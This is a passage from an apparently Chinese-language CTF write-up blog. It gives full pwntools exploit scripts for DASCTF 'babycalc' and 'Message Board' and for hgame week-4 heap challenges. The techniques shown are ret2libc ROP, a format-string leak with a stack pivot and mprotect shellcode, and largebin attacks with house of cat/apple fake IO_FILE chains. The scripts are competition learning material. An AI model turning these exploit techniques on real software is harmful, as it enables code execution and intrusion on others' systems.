simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            real_val = solution_state.solver.<span class="hljs-built_in">eval</span>(val[i])<br>            <span class="hljs-built_in">print</span>(real_val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find!&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Go()<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/img/11/Screenshot_20230216_102443.png"></p><p>😋好神奇！angr真滴强！</p><p>​</p><p>完整exp</p><p>远程libc为2.23-0ubuntu11.3_amd64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babycalc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    pop_rdi = <span class="hljs-number">0x400ca3</span><br>    ret = pop_rdi + <span class="hljs-number">1</span><br>    rop1 = p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(ret) * <span class="hljs-number">0x10</span> +  p64(<span class="hljs-number">0x400650</span>) <span class="hljs-comment">#</span><br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop1<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>    rop2 = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop2<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">26087</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><p>格式化字符串泄漏<code>__libc_start_main</code>函数地址，利用栈迁移到bss段继续执行ROP，使用mprotect函数更改bss的执行权限，最后执行shellcode。</p><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">22429</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span> <br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>libc = elf.libc<br><br>bss = <span class="hljs-number">0x4040b0</span><br>pop_rdi = <span class="hljs-number">0x401413</span><br>leave_ret = <span class="hljs-number">0x4012e1</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Welcome to DASCTF message board, please leave your name:&#x27;</span>,<span class="hljs-string">b&#x27;%31$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span> + p64(bss + <span class="hljs-number">0xb0</span>) + p64(<span class="hljs-number">0x40136C</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(bss - <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">7</span>),<br>    p64(mprotect),<br>    p64(bss + <span class="hljs-number">0x40</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload = payload.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(bss -<span class="hljs-number">8</span>) + p64(leave_ret)<br>p.sendafter(<span class="hljs-string">&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hgame-week4-pwn</title>
    <link href="/2023/02/07/hgame-week4-pwn/"/>
    <url>/2023/02/07/hgame-week4-pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="without-hook"><a href="#without-hook" class="headerlink" title="without_hook"></a>without_hook</h3><p>libc给的是2.36-0ubuntu2_amd64，以前修改<code>__free_hook</code>和<code>__malloc_hook</code>的方法就行不通了，很容易想到使用largebin attack攻击去劫持IO控制流，最后构造house of cat或者house of apple的<code>fake_IO_FILE</code>，和以前我做过<a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#store">强网拟态的一道题</a>很像。</p><p>唯一有区别的就是以前常用的<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>这个gadget似乎在该版本的libc中找不到了</p><p><img src="/img/11/Screenshot_20230208_095848.jpg"></p><p>这里我改用<code>mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</code>这个gadget，使用house of apple去实现setcontext函数对rsp的劫持。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32393</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x520</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">2060528</span><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>))<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x520</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xcc0</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>edit(<span class="hljs-number">2</span>, payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="4nswer’s-gift"><a href="#4nswer’s-gift" class="headerlink" title="4nswer’s gift"></a>4nswer’s gift</h3><p>这道题白给了libc的地址，并且直接让你去劫持IO控制流；虽然没有给堆地址，题目给了提示Linux内核版本为5.15，当申请堆块足够大时就会直接返回一块在libc上边的内存，且偏移固定，这样我们就能直接利用house of cat或者house of apple完成攻击。</p><p>​</p><p>house of cat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30252</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x400</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x1c0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(sys_addr)<br><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, fake_IO_FILE)<br><span class="hljs-comment">#pause()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><p>house of apple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30252</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span> <span class="hljs-comment">#0x290000 0x380000</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span 